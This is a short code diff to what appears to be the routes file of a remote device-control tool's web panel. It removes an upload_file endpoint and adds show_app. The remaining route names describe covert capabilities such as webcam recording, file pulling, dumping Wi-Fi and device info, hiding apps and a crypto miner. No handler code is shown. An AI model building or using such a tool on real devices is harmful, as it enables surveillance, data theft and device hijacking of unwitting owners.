@@ -68,7 +68,6 @@ end
         post :uninstall_app
         post :list_apps
         post :open_app
-        post :upload_file
         post :wake_lock
         post :dump_wifi_info
         get :webcam_record
@@ -77,6 +76,7 @@ end
         post :dump_device_info
         post :pull_file
         get :hide_app
+        get :show_app
         get :crypto_minner
 
 
